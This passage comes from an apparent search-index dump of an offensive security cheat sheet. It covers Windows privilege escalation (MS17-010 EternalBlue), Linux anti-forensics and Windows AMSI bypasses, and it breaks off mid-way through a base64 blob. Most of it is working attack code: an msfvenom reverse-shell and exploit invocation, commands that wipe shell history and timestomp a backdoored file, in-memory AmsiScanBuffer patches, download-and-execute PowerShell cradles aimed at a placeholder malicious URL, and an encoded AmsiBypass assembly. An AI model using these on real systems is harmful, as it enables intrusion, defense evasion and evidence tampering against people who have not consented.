exploit/windows/local/ms16_032_secondary_logon_handle_privesc\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#ms17-010-eternal-blue","title":"MS17-010 (Eternal Blue)","text":"<p>Check the vulnerability with the following nmap script or crackmapexec: <code>crackmapexec smb 10.10.10.10 -u '' -p '' -d domain -M ms17-010</code>.</p> <pre><code>nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17\u2013010 &lt;ip_netblock&gt;\n</code></pre> <p>Metasploit modules to exploit <code>EternalRomance/EternalSynergy/EternalChampion</code>.</p> <pre><code>auxiliary/admin/smb/ms17_010_command          MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution\nauxiliary/scanner/smb/smb_ms17_010            MS17-010 SMB RCE Detection\nexploit/windows/smb/ms17_010_eternalblue      MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\nexploit/windows/smb/ms17_010_eternalblue_win8 MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+\nexploit/windows/smb/ms17_010_psexec           MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\n</code></pre> <p>If you can't use Metasploit and only want a reverse shell.</p> <pre><code>git clone https://github.com/helviojunior/MS17-010\n\n# generate a simple reverse shell to use\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe\npython2 send_and_execute.py 10.0.0.1 revshell.exe\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#cve-2019-1388","title":"CVE-2019-1388","text":"<p>Exploit : https://packetstormsecurity.com/files/14437/hhupd.exe.html</p> <p>Requirement: - Windows 7  - Windows 10 LTSC 10240</p> <p>Failing on :  - LTSC 2019 - 1709 - 1803</p> <p>Detailed information about the vulnerability : https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege</p>"},{"location":"redteam/escalation/windows-privilege-escalation/#references","title":"References","text":"<ul> <li>icacls - Docs Microsoft</li> <li>Privilege Escalation Windows - Philip Linghammar</li> <li>Windows elevation of privileges - Guifre Ruiz</li> <li>The Open Source Windows Privilege Escalation Cheat Sheet by amAK.xyz and @xxByte</li> <li>Basic Linux Privilege Escalation</li> <li>Windows Privilege Escalation Fundamentals</li> <li>TOP\u201310 ways to boost your privileges in Windows systems - hackmag</li> <li>The SYSTEM Challenge</li> <li>Windows Privilege Escalation Guide - absolomb's security blog</li> <li>Chapter 4 - Windows Post-Exploitation - 2 Nov 2017 - dostoevskylabs</li> <li>Remediation for Microsoft Windows Unquoted Service Path Enumeration Vulnerability - September 18th, 2016 - Robert Russell</li> <li>Pentestlab.blog - WPE-01 - Stored Credentials</li> <li>Pentestlab.blog - WPE-02 - Windows Kernel</li> <li>Pentestlab.blog - WPE-03 - DLL Injection</li> <li>Pentestlab.blog - WPE-04 - Weak Service Permissions</li> <li>Pentestlab.blog - WPE-05 - DLL Hijacking</li> <li>Pentestlab.blog - WPE-06 - Hot Potato</li> <li>Pentestlab.blog - WPE-07 - Group Policy Preferences</li> <li>Pentestlab.blog - WPE-08 - Unquoted Service Path</li> <li>Pentestlab.blog - WPE-09 - Always Install Elevated </li> <li>Pentestlab.blog - WPE-10 - Token Manipulation</li> <li>Pentestlab.blog - WPE-11 - Secondary Logon Handle</li> <li>Pentestlab.blog - WPE-12 - Insecure Registry Permissions</li> <li>Pentestlab.blog - WPE-13 - Intel SYSRET</li> <li>Alternative methods of becoming SYSTEM - 20th November 2017 - Adam Chester @xpn</li> <li>Living Off The Land Binaries and Scripts (and now also Libraries)</li> <li>Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec</li> <li>Local Privilege Escalation Workshop - Slides.pdf - @sagishahar</li> <li>Abusing Diaghub - xct - March 07, 2019</li> <li>Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege - James Forshaw, Project Zero - Wednesday, April 18, 2018</li> <li>Weaponizing Privileged File Writes with the USO Service - Part 2/2 - itm4n - August 19, 2019</li> <li>Hacking Trick: Environment Variable $Path Interception y Escaladas de Privilegios para Windows</li> <li>Abusing SeLoadDriverPrivilege for privilege escalation - 14 JUN 2018 - OSCAR MALLO</li> <li>Universal Privilege Escalation and Persistence \u2013 Printer - AUGUST 2, 2021)</li> <li>ABUSING ARBITRARY FILE DELETES TO ESCALATE PRIVILEGE AND OTHER GREAT TRICKS - March 17, 2022 | Simon Zuckerbraun</li> <li>Bypassing AppLocker by abusing HashInfo - 2022-08-19 - Ian</li> <li>Giving JuicyPotato a second chance: JuicyPotatoNG - @decoder_it, @splinter_code</li> <li>IN THE POTATO FAMILY, I WANT THEM ALL - @BlWasp_ </li> <li>Potatoes - Windows Privilege Escalation - Jorge Lajara - November 22, 2020</li> <li>MSIFortune - LPE with MSI Installers - Oct 3, 2023 - PfiatDe</li> <li>MSI Shenanigans. Part 1 \u2013 Offensive Capabilities Overview - DECEMBER 8, 2022 - Mariusz Banach</li> <li>Escalating Privileges via Third-Party Windows Installers - ANDREW OLIVEAU - JUL 19, 2023</li> <li>Deleting Your Way Into SYSTEM: Why Arbitrary File Deletion Vulnerabilities Matter - ANDREW OLIVEAU - SEP 11, 2023</li> <li>ABUSING ARBITRARY FILE DELETES TO ESCALATE PRIVILEGE AND OTHER GREAT TRICKS - Simon Zuckerbraun - March 17, 2022 </li> </ul>"},{"location":"redteam/evasion/linux-evasion/","title":"Linux - Evasion","text":""},{"location":"redteam/evasion/linux-evasion/#summary","title":"Summary","text":"<ul> <li>File names</li> <li>Command history</li> <li>Hiding text</li> <li>Timestomping</li> </ul>"},{"location":"redteam/evasion/linux-evasion/#file-names","title":"File Names","text":"<p>An Unicode zero-width space can be inserted into filenames which makes the names visually indistinguishable:</p> <pre><code># A decoy file with no special characters\ntouch 'index.php'\n\n# An imposter file with visually identical name\ntouch $'index\\u200D.php'\n</code></pre>"},{"location":"redteam/evasion/linux-evasion/#command-history","title":"Command History","text":"<p>Most shells save their command history so a user can recall them again later.  The command history can be viewed with the <code>history</code> command or by manually inspecting the contents of the file pointed to by <code>$HISTFILE</code> (e.g. <code>~/.bash_history</code>). This can be prevented in a number of ways.</p> <pre><code># Prevent writing to the history file at all\nunset HISTFILE\n\n# Don't save this session's command history in memory\nexport HISTSIZE=0\n</code></pre> <p>Individual commands that match a pattern in <code>HISTIGNORE</code> will be excluded from the command history, regardless of <code>HISTFILE</code> or <code>HISTSIZE</code> settings. By default, <code>HISTIGNORE</code> will ignore all commands that begin with whitespace:</p> <pre><code># Note the leading space character:\n my-sneaky-command\n</code></pre> <p>If commands are accidentally added to the command history, individual command entries can be removed with <code>history -d</code>:</p> <pre><code># Removes the most recently logged command.\n# Note that we actually have to delete two history entries at once,\n# otherwise the `history -d` command itself will be logged as well.\nhistory -d -2 &amp;&amp; history -d -1\n</code></pre> <p>The entire command history can be purged as well, although this approach is much less subtle and very likely to be noticed:</p> <pre><code># Clears the in-memory history and writes the empty history to disk.\nhistory -c &amp;&amp; history -w\n</code></pre>"},{"location":"redteam/evasion/linux-evasion/#hiding-text","title":"Hiding Text","text":"<p>ANSI escape sequences can be abused to hide text under certain circumstances. If the file's contents are printed to the terminal (e.g. <code>cat</code>, <code>head</code>, <code>tail</code>) then the text will be hidden. If the file is viewed with an editor (e.g. <code>vim</code>, <code>nano</code>, <code>emacs</code>), then the escape sequences will be visible.</p> <pre><code>echo \"sneaky-payload-command\" &gt; script.sh\necho \"# $(clear)\" &gt;&gt; script.sh\necho \"# Do not remove. Generated from /etc/issue.conf by configure.\" &gt;&gt; script.sh\n\n# When printed, the terminal will be cleared and only the last line will be visible:\ncat script.sh\n</code></pre>"},{"location":"redteam/evasion/linux-evasion/#timestomping","title":"Timestomping","text":"<p>Timestomping refers to the alteration of a file or directory's modification/access timestamps in order to conceal the fact that it was modified. The simplest way to accomplish this is with the <code>touch</code> command:</p> <pre><code># Changes the access (-a) and modification (-m) times using YYYYMMDDhhmm format.\ntouch -a -m -t 202210312359 \"example\"\n\n# Changes time using a Unix epoch timestamp.\ntouch -a -m -d @1667275140 \"example\"\n\n# Copies timestamp from one file to another.\ntouch -a -m -r \"other_file\" \"example\"\n\n# Get the file's modification timestamp, modify the file, then restore the timestamp.\nMODIFIED_TS=$(stat --format=\"%Y\" \"example\")\necho \"backdoor\" &gt;&gt; \"example\"\ntouch -a -m -d @$MODIFIED_TS \"example\"\n</code></pre> <p>It should be noted that <code>touch</code> can only modify the access and modification timestamps.  It can't be used to update a file's \"change\" or \"birth\" timestamps.  The birth timestamp, if supported by the filesystem, tracks when the file was created.  The change timestamp tracks whenever the file's metadata changes, including updates to the access and modification timestamps.</p> <p>If an attacker has root privileges, they can work around this limitation by modifying the system clock, creating or modifying a file, then reverting the system clock:</p> <pre><code>ORIG_TIME=$(date)\ndate -s \"2022-10-31 23:59:59\"\ntouch -a -m \"example\"\ndate -s \"${ORIG_TIME}\"\n</code></pre> <p>Don't forget that creating a file also updates the parent directory's modification timestamp as well!</p>"},{"location":"redteam/evasion/linux-evasion/#references","title":"References","text":"<ul> <li>ATT&amp;CK - Impair Defenses: Impair Command History Logging</li> <li>ATT&amp;CK - Indicator Removal: Timestomp</li> <li>ATT&amp;CK - Indicator Removal on Host: Clear Command History</li> <li>ATT&amp;CK - Masquerading: Match Legitimate Name or Location</li> <li>Wikipedia - ANSI escape codes</li> <li>InverseCos - Detecting Linux Anti-Forensics: Timestomping</li> </ul>"},{"location":"redteam/evasion/windows-amsi-bypass/","title":"Windows - AMSI Bypass","text":""},{"location":"redteam/evasion/windows-amsi-bypass/#summary","title":"Summary","text":"<ul> <li>List AMSI Providers</li> <li>Which Endpoint Protection is Using AMSI</li> <li>Patching amsi.dll AmsiScanBuffer by rasta-mouse</li> <li>Dont use net webclient</li> <li>Amsi ScanBuffer Patch from -&gt; https://www.contextis.com/de/blog/amsi-bypass</li> <li>Forcing an error</li> <li>Disable Script Logging</li> <li>Amsi Buffer Patch - In memory</li> <li>Same as 6 but integer Bytes instead of Base64</li> <li>Using Matt Graeber's Reflection method</li> <li>Using Matt Graeber's Reflection method with WMF5 autologging bypass</li> <li>Using Matt Graeber's second Reflection method</li> <li>Using Cornelis de Plaa's DLL hijack method</li> <li>Use Powershell Version 2 - No AMSI Support there</li> <li>Nishang all in one</li> <li>Adam Chesters Patch</li> <li>AMSI.fail</li> </ul>"},{"location":"redteam/evasion/windows-amsi-bypass/#list-amsi-providers","title":"List AMSI Providers","text":"<ul> <li>List providers with : <code>Get-ChildItem -Path 'HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\'</code></li> <li>Find software from CLSID     <pre><code>Get-ChildItem -Path 'HKLM:\\SOFTWARE\\Classes\\CLSID\\{2781761E-28E0-4109-99FE-B9D127C57AFE}'\nName                           Property\n----                           --------\nHosts                          (default) : Scanned Hosting Applications\nInprocServer32                 (default) : \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2210.4-0\\MpOav.dll\"\n</code></pre></li> </ul>"},{"location":"redteam/evasion/windows-amsi-bypass/#which-endpoint-protection-is-using-amsi","title":"Which Endpoint Protection is Using AMSI","text":"<p>Small extract from subat0mik/whoamsi - An effort to track security vendors' use of Microsoft's Antimalware Scan Interface:</p> Vendor/Product AMSI Date Reference Avast Y 03/20/2016 https://forum.avast.com/index.php?topic=184491.msg1300884#msg1300884 AVG Y 03/08/2016 https://support.avg.com/answers?id=906b00000008oUTAAY BitDefender Consumer Y 09/20/2016 https://forum.bitdefender.com/index.php?/topic/72455-antimalware-scan-service/ BitDefender Enterprise Y 05/25/2021 https://twitter.com/Bitdefender_Ent/status/1397187195669295111?s=20 Kaspersky Anti Targeted Attack Platform Y 10/10/2018 https://help.kaspersky.com/KIS/2019/en-US/119653.htm Symantec Advanced Threat Protection Y 07/15/2020 https://techdocs.broadcom.com/content/broadcom/techdocs/us/en/symantec-security-software/endpoint-security-and-management/endpoint-protection/all/release-notes/Whats-new-for-Symantec-Endpoint-Protection-14_3-.html Microsoft Defender for Endpoint Y 06/09/2015 https://www.microsoft.com/security/blog/2015/06/09/windows-10-to-offer-application-developers-new-malware-defenses/"},{"location":"redteam/evasion/windows-amsi-bypass/#patching-amsidll-amsiscanbuffer-by-rasta-mouse","title":"Patching amsi.dll AmsiScanBuffer by rasta-mouse","text":"<pre><code>$Win32 = @\"\n\nusing System;\nusing System.Runtime.InteropServices;\n\npublic class Win32 {\n\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr LoadLibrary(string name);\n\n    [DllImport(\"kernel32\")]\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n\n}\n\"@\n\nAdd-Type $Win32\n\n$LoadLibrary = [Win32]::LoadLibrary(\"am\" + \"si.dll\")\n$Address = [Win32]::GetProcAddress($LoadLibrary, \"Amsi\" + \"Scan\" + \"Buffer\")\n$p = 0\n[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)\n$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)\n[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)\n</code></pre>"},{"location":"redteam/evasion/windows-amsi-bypass/#dont-use-net-webclient","title":"Dont use net webclient","text":"<p>Not Working anymore, there was a patch for it</p> <pre><code>$webreq = [System.Net.WebRequest]::Create(\u2018https://maliciousscripturl/malicious.ps1\u2019)\n$resp=$webreq.GetResponse()\n$respstream=$resp.GetResponseStream()\n$reader=[System.IO.StreamReader]::new($respstream)\n$content=$reader.ReadToEnd()\nIEX($content)\n</code></pre>"},{"location":"redteam/evasion/windows-amsi-bypass/#the-short-version-of-dont-use-powershell-net-webclient","title":"The Short version of dont use powershell net webclient","text":"<p>Not Working anymore, there was a patch for it</p> <pre><code>IEX([Net.Webclient]::new().DownloadString(\"https://maliciousscripturl/malicious.ps1\"))\n</code></pre>"},{"location":"redteam/evasion/windows-amsi-bypass/#amsi-scanbuffer-patch","title":"Amsi ScanBuffer Patch","text":"<p>Egghunter with blog post: https://www.contextis.com/us/blog/amsi-bypass</p> <pre><code>Write-Host \"-- AMSI Patch\"\nWrite-Host \"-- Paul La\u00een\u00e9 (@am0nsec)\"\nWrite-Host \"\"\n\n$Kernel32 = @\"\nusing System;\nusing System.Runtime.InteropServices;\n\npublic class Kernel32 {\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);\n\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr LoadLibrary(string lpLibFileName);\n\n    [DllImport(\"kernel32\")]\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n}\n\"@\n\nAdd-Type $Kernel32\n\nClass Hunter {\n    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {\n        while ($true) {\n            [int]$count = 0\n\n            while ($true) {\n                [IntPtr]$address = [IntPtr]::Add($address, 1)\n                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {\n                    $count++\n                    If ($count -eq $egg.Length) {\n                        return [IntPtr]::Subtract($address, $egg.Length - 1)\n                    }\n                } Else { break }\n            }\n        }\n\n        return $address\n    }\n}\n\n[IntPtr]$hModule = [Kernel32]::LoadLibrary(\"amsi.dll\")\nWrite-Host \"[+] AMSI DLL Handle: $hModule\"\n\n[IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, \"DllCanUnloadNow\")\nWrite-Host \"[+] DllCanUnloadNow address: $dllCanUnloadNowAddress\"\n\nIf ([IntPtr]::Size -eq 8) {\n    Write-Host \"[+] 64-bits process\"\n    [byte[]]$egg = [byte[]] (\n        0x4C, 0x8B, 0xDC,       # mov     r11,rsp\n        0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx\n        0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp\n        0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi\n        0x57,                   # push    rdi\n        0x41, 0x56,             # push    r14\n        0x41, 0x57,             # push    r15\n        0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h\n    )\n} Else {\n    Write-Host \"[+] 32-bits process\"\n    [byte[]]$egg = [byte[]] (\n        0x8B, 0xFF,             # mov     edi,edi\n        0x55,                   # push    ebp\n        0x8B, 0xEC,             # mov     ebp,esp\n        0x83, 0xEC, 0x18,       # sub     esp,18h\n        0x53,                   # push    ebx\n        0x56                    # push    esi\n    )\n}\n[IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)\nWrite-Host \"[+] Targeted address: $targetedAddress\"\n\n$oldProtectionBuffer = 0\n[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null\n\n$patch = [byte[]] (\n    0x31, 0xC0,    # xor rax, rax\n    0xC3           # ret  \n)\n[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)\n\n$a = 0\n[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null\n</code></pre>"},{"location":"redteam/evasion/windows-amsi-bypass/#forcing-an-error","title":"Forcing an error","text":"<pre><code>$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)\n\n[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiSession\",\"NonPublic,Static\").SetValue($null, $null);[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiContext\",\"NonPublic,Static\").SetValue($null, [IntPtr]$mem)\n</code></pre>"},{"location":"redteam/evasion/windows-amsi-bypass/#disable-script-logging","title":"Disable Script Logging","text":"<pre><code>$settings = [Ref].Assembly.GetType(\"System.Management.Automation.Utils\").GetField(\"cachedGroupPolicySettings\",\"NonPublic,Static\").GetValue($null);\n$settings[\"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"] = @{}\n$settings[\"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"].Add(\"EnableScriptBlockLogging\", \"0\")\n</code></pre> <pre><code>[Ref].Assembly.GetType(\"System.Management.Automation.ScriptBlock\").GetField(\"signatures\",\"NonPublic,static\").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))\n</code></pre>"},{"location":"redteam/evasion/windows-amsi-bypass/#amsi-buffer-patch-in-memory","title":"Amsi Buffer Patch - In memory","text":"<pre><code>function Bypass-AMSI\n{\n    if(-not ([System.Management.Automation.PSTypeName]\"Bypass.AMSI\").Type) {     [Reflection.Assembly]::Load([Convert]::FromBase64String(\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAMBOqJAAAAAAAAAAAOAAIiALATAAAA4AAAAGAAAAAAAAWiwAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAAcsAABPAAAAAEAAADADAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAAAoKwAAVAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAaAwAAAAgAAAADgAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAADADAAAAQAAAAAQAAAAQAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAAFAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAA7LAAAAAAAAEgAAAACAAUAQCEAAOgJAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMwBADZAAAAAQAAEQByAQAAcCgCAAAGCgZ+DAAACigNAAAKEwYRBiwUAHITAABwKA4AAAoAFxMHOKUAAAAGcmsAAHAoAQAABgsHfgwAAAooDQAAChMIEQgsEQByiQAAcCgOAAAKABcTByt3G2ooDwAACgwWDQcIH0ASAygDAAAGFv4BEwkRCSwRAHL9AABwKA4AAAoAFxMHK0gZjRIAAAEl0AEAAAQoEAAAChMEGSgRAAAKEwURBBYRBRkoEgAACgAHHxsoEwAAChEFGSgEAAAGAHJzAQBwKA4AAAoAFhMHKwARByoiAigUAAAKACoAAEJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAANQCAAAjfgAAQAMAALADAAAjU3RyaW5ncwAAAADwBgAAyAEAACNVUwC4CAAAEAAAACNHVUlEAAAAyAgAACABAAAjQmxvYgAAAAAAAAACAAABV5UCNAkCAAAA+gEzABYAAAEAAAAWAAAABAAAAAEAAAAGAAAACgAAABQAAAALAAAAAQAAAAEAAAACAAAABAAAAAEAAAABAAAAAQAAAAEAAAAAAFcCAQAAAAAABgCaAdACBgDsAdACBgD0AJ4CDwDwAgAABgAfARsCBgDTAW0CBgB7AW0CBgA4AW0CBgBVAW0CBgC6AW0CBgAIAW0CBgAyA2YCBgDZANACBgDPAGYCBgCXAmYCBgCnAGYCBgCWAmYCBgAKAmYCBgD/AtACBgB/A2YCBgCUAGYCBgBCArECAAAAACYAAAAAAAEAAQABABAAdwAOAzEAAQABAAABAAAvAAAAMQABAAcAEwEAAAoAAAA5AAIABwAzAU4AWwAAAAAAgACWIBkDXwABAAAAAACAAJYgigNlAAMAAAAAAIAAliBIA2oABAAAAAAAgACRIJkDcwAIAFAgAAAAAJYAjAB6AAsANSEAAAAAhhiQAgYACwAAAAEArwAAAAIAtwAAAAEAwAAAAAEAKAMAAAIADwIAAAMAVwMCAAQAOQMAAAEAcAMAAAIAfAAAAAMAFgIJAJACAQARAJACBgAZAJACCgApAJACEAAxAJACEAA5AJACEABBAJACEABJAJACEABRAJACEABZAJACEABpAJACBgB5AIsCIwB5AKQDJgCBAMUALACJAGQDMQCZAHUDNgCxADUCPgCxAIUDQwB5AH8CTABhAJACBgAuAAsAfgAuABMAhwAuABsApgAuACMArwAuACsA5gAuADMA9gAuADsAAQEuAEMADgEuAEsA5gAuAFMA5gBjAFsAGQEBAAMAAAAEABUAAQBKAgABAwAZAwEAAAEFAIoDAQAAAQcASAMBAAABCQCWAwIAYCwAAAEABIAAAAEAAAAAAAAAAAAAAAAADgMAAAIAAAAAAAAAAAAAAFIAgAAAAAAABAADAAAAAAAAa2VybmVsMzIAX19TdGF0aWNBcnJheUluaXRUeXBlU2l6ZT0zADxNb2R1bGU+ADxQcml2YXRlSW1wbGVtZW50YXRpb25EZXRhaWxzPgA1MUNBRkI0ODEzOUIwMkUwNjFENDkxOUM1MTc2NjIxQkY4N0RBQ0VEAEFNU0kAc3JjAG5ldHN0YW5kYXJkAERpc2FibGUAUnVudGltZUZpZWxkSGFuZGxlAENvbnNvbGUAaE1vZHVsZQBwcm9jTmFtZQBuYW1lAFdyaXRlTGluZQBWYWx1ZVR5cGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAFRhcmdldEZyYW1ld29ya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5SW5mb3JtYXRpb25hbFZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBCeXRlAGR3U2l6ZQBzaXplAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcAQWxsb2NIR2xvYmFsAE1hcnNoYWwAS2VybmVsMzIuZGxsAEFtc2lCeXBhc3MuZGxsAFN5c3RlbQBTeXN0ZW0uUmVmbGVjdGlvbgBvcF9BZGRpdGlvbgBaZXJvAC5jdG9yAFVJbnRQdHIAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAFJ1bnRpbWVIZWxwZXJzAEFtc2lCeXBhc3MAR2V0UHJvY0FkZHJlc3MAbHBBZGRyZXNzAE9iamVjdABscGZsT2xkUHJvdGVjdABWaXJ0dWFsUHJvdGVjdABmbE5ld1Byb3RlY3QAb3BfRXhwbGljaXQAZGVzdABJbml0aWFsaXplQXJyYXkAQ29weQBMb2FkTGlicmFyeQBSdGxNb3ZlTWVtb3J5AG9wX0VxdWFsaXR5AAARYQBtAHMAaQAuAGQAbABsAABXRQBSAFIATwBSADoAIABDAG8AdQBsAGQAIABuAG8AdAAgAHIAZQB0AHIAaQBlAHYAZQAgAGEAbQBzAGkALgBkAGwAbAAgAHAA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